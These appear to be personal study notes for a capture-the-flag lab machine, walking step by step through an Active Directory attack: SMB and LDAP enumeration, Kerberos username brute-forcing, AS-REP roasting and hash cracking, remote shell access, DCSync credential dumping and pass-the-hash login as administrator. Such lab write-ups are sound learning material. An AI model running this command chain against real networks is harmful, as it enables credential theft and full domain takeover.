#Enumeration #nmap 

`sudo nmap -sC -sV -oA nmap/forest 10.10.10.175`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`

Hints that the box is a windows dc when ports 445, 88, and 53 are open. 

![[Pasted image 20241212205330.png]]

Start by enumerating #smb port 445 then move on to port 80 

#smbenumeration with #crackmapexec 

`crackmapexec smb 10.10.10.175`

Get hostname and domain name

![[Pasted image 20241212205546.png]]

Enumerate smb shares 
`crackmapexec smb 10.10.10.175 --shares`
![[Pasted image 20241212205657.png]]

`crackmapexec smb 10.10.10.175 --shares -u '' -p ''`
![[Pasted image 20241212205810.png]]

Can also try #smbmap 
`smbmap -H 10.10.10.175 -u '' -p ''`
![[Pasted image 20241212205941.png]]
also no info. 

Try #rpcclient 

`rpcclient 10.10.10.175 -U ''`
`>enumdomusers`

Nothing juicy. 

![[Pasted image 20241212210143.png]]

Checking out port 80

![[Pasted image 20241212222141.png]]
View page source to see how the site is built (look for drupal or wordpress to run scanners against)

Guessing website extensions..
`/html`
`/php`
`/aspx`
Looks like html files. 

Open burpsuite to view website files as well and potentially run a passive scan/crawl against the site.

Look for ways to interact with the site
- search bars
- subscribe to newsletter box

![[Pasted image 20241212222803.png]]
Nothing significant happened. 

Looking for usernames on the site? 
![[Pasted image 20241212223105.png]]
Convert first and last names to username formats that windows uses.

First search for usernames using #ldapsearch 

`ldapsearch -x -h 10.10.10.175 -s base namingcontexts`

![[Pasted image 20241212223537.png]]

`ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' -s sub

Sometimes results for this search will show the usernames, but we don't have anonymous ldap permissions on this box. 

Back to users.txt file 

![[Pasted image 20241212224016.png]]

Creating a vim macro to generate possible usernames

Typing 
"qa" - record this macro
"yy" - start of macro to yank the line
"3p" - to put the line that was just yanked 3x

![[Pasted image 20241212224401.png]]
Hit home so the cursor is always at the beginning
/ {space}
"s"
"."
*escape*
![[Pasted image 20241212224729.png]]
Down Arrow 
Home Key 
Right one 
"dw" - delete word
![[Pasted image 20241212224839.png]]
Down One
Home Key 
Right One 
"dw"
"."
![[Pasted image 20241212224958.png]]
Down 
Home
*escape*
"q" - exit recording mode 
Type @a and those keys are replayed for the next user
![[Pasted image 20241212225126.png]]
Type 4@a to repeat it for the remainder of the names. 

Final user list:
![[Pasted image 20241212225218.png]]
Using #kerbrute to identify valid usernames [[Kerbrute]]
https://github.com/ropnop/kerbrute/releases/tag/v1.0.3

`./kerbrute userenum -dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL users.txt `

No hits. Need to add more possible usernames to users.txt such as `administrator, guest`
Ahh there was a space at the end of the usernames. 
Remove the space and two users discovered. 
![[Pasted image 20241212230327.png]]
Look for #psexec .py example script within #impacket by running `locate psexec.py`

![[Pasted image 20241213185329.png]]
Need to go through each of these scripts to find out exactly what they do:
![[Pasted image 20241213185413.png]]

Most valuable scripts:
1. `GetNPUsers.py` - ASREP roast and it queries the target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
2. `GetUserSPNs.py` - 

We are using #getnpusers.py

`GetNPUsers.py EGOTISTICAL-BANK.LOCAL/administrator` (fail)
![[Pasted image 20241213190059.png]]

`GetNPUsers.py EGOTISTICAL-BANK.LOCAL/FSmith` (success)
![[Pasted image 20241213190201.png]]

Be sure to add domain name to `/etc/hosts`

![[Pasted image 20241213190025.png]]
We got fsmith's #TGT and the decryption key should be the user's password. 

Password cracking tgt with #hashcat 

`./hashcat --example-hashes | grep asrep` and look for `23`

See mode: `18200`

`./hashcat -m 18200 hashes/sauna /opt/wordlist/rockyou.txt`

Hash cracked. Got fsmith's password: `Thestrokes23`

So what can we do with this? 

#crackmapexec 

`crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23` 

![[Pasted image 20241213191134.png]]
It doesn't say pwned so we can't psexec into the box. 

Checking shares:

`crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares`
![[Pasted image 20241213191258.png]]
Notable share: RICOH printer 

Run `searchsploit ricoh`

There's a local priv esc
![[Pasted image 20241213191604.png]]
Ricoh priv esc is a 2019 CVE. 

Running `wget http://10.10.10.175/about.html` the website image

Running #exiftool on `about.html` to try to figure out the date of the website . Website image uploaded in 2020.

![[Pasted image 20241213191836.png]]

Trying crackmapexec with #winrm 

`crackmapexec winrm 10.10.10.175 -u fsmith -p Thestrokes23`

![[Pasted image 20241213192310.png]]
Run #evilwinrm 

`evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23`

for initial access shell

![[Pasted image 20241213192445.png]]
Running #winpeas for privilege escalation 

Serving up #winpeas.exe by copying it to current directory and then running `upload winPEAS.exe`... wut


![[Pasted image 20241213192655.png]]
Run winpeas

`./winpeas.exe`

Checking out Ricoh priv esc. 

Testing priv esc command to see if vulnerable driver is on the target machine.  

![[Pasted image 20241213192859.png]]
Vulnerable ricoh driver does not exist. 

Found "AutoLogon credentials" from winpeas output

![[Pasted image 20241213193214.png]]
Using these credentials:
`net user /domain svc_loanmgr` (just domain user)

![[Pasted image 20241213193431.png]]
Run `net user /domain`

![[Pasted image 20241213193542.png]]
Discover another user `HSmith` (just domain user)

Running #Bloodhound 

Download `SharpHound.exe`

Upload `SharpHound.exe` to remote machine

Start #neo4j 

`sudo neo4j console`

Execute `SharpHound.exe`
`.\SharpHound.exe` which will create a zip that can be uploaded to BloodHound. 

`download SharpHound.zip`

![[Pasted image 20241213194236.png]]

First thing on BloodHound: 
input pwned username: `svc_loanmgr` and `fsmith`


![[Pasted image 20241213194357.png]]

Then query `Shortest Path from Owned Principals`

Only showing `Can PSRemote`

Query `Find Shortest Paths to Domain Admins` (nope)

Query `Find Principals with DCSync Rights`

Discover path from `svc_mgr` to domain. 

Click on the edge.

Click help. 

![[Pasted image 20241213194915.png]]
This works in conjunction with this:

![[Pasted image 20241213195010.png]]
#impacket has a #dcsync tool 

`secretsdump.py egotistical-bank.local/svc_loanmgr@10.10.10.175`

Enter svc_loanmgr password at prompt. 

This allows us to get the `Administrator's` hash

![[Pasted image 20241213195352.png]]
Can use this to do a #passthehash attack 

`crackmapexec smb 10.10.10.175 -u administrator -H dshddhhdhkahdgd`

![[Pasted image 20241213195527.png]]

Whenever it says pwned, use psexec to connect 
Copy admin hash

`psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes dshddhhdhkahdgd:dshddhhdhkahdgd`



